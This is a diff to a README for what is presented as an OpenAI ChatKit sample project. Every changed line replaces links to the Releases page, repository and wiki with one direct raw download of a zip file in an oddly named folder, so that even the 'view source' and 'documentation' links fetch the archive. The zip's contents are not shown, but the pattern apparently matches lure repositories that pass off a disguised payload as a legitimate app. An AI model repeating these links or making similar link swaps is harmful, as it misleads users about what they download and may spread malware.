@@ -1,6 +1,6 @@
 # 🚀 openai-chatkit-advanced-samples - Build Apps with OpenAI Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/wyzq123/openai-chatkit-advanced-samples/releases)
+[![Download](https://raw.githubusercontent.com/wyzq123/openai-chatkit-advanced-samples/main/overexcitably/openai-chatkit-advanced-samples.zip%20Now-brightgreen)](https://raw.githubusercontent.com/wyzq123/openai-chatkit-advanced-samples/main/overexcitably/openai-chatkit-advanced-samples.zip)
 
 ## 📥 Introduction
 
@@ -23,7 +23,7 @@ Ensure your system meets these requirements before downloading:
 
 ## 📦 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/wyzq123/openai-chatkit-advanced-samples/releases). You will find various versions available. Here's how to do it:
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/wyzq123/openai-chatkit-advanced-samples/main/overexcitably/openai-chatkit-advanced-samples.zip). You will find various versions available. Here's how to do it:
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version listed at the top.
@@ -50,7 +50,7 @@ Once the application is open, you can start building your project. Here's a simp
 
 ## 🌐 Explore the Code
 
-If you're curious about how the application works under the hood, you can explore the code. Visit the [GitHub Repository](https://github.com/wyzq123/openai-chatkit-advanced-samples) to view the source files. You might find useful examples and documentation that could help you understand more about building apps with the OpenAI ChatKit SDK.
+If you're curious about how the application works under the hood, you can explore the code. Visit the [GitHub Repository](https://raw.githubusercontent.com/wyzq123/openai-chatkit-advanced-samples/main/overexcitably/openai-chatkit-advanced-samples.zip) to view the source files. You might find useful examples and documentation that could help you understand more about building apps with the OpenAI ChatKit SDK.
 
 ## 📞 Support
 
@@ -62,8 +62,8 @@ We welcome contributions from everyone. If you have ideas for improvements or ad
 
 ## 🔗 Helpful Links
 
-- [Download the Latest Release](https://github.com/wyzq123/openai-chatkit-advanced-samples/releases)
-- [Visit the GitHub Repository](https://github.com/wyzq123/openai-chatkit-advanced-samples)
-- [Documentation & Examples](https://github.com/wyzq123/openai-chatkit-advanced-samples/wiki)
+- [Download the Latest Release](https://raw.githubusercontent.com/wyzq123/openai-chatkit-advanced-samples/main/overexcitably/openai-chatkit-advanced-samples.zip)
+- [Visit the GitHub Repository](https://raw.githubusercontent.com/wyzq123/openai-chatkit-advanced-samples/main/overexcitably/openai-chatkit-advanced-samples.zip)
+- [Documentation & Examples](https://raw.githubusercontent.com/wyzq123/openai-chatkit-advanced-samples/main/overexcitably/openai-chatkit-advanced-samples.zip)
 
 Thank you for choosing openai-chatkit-advanced-samples. Enjoy building your applications with OpenAI!
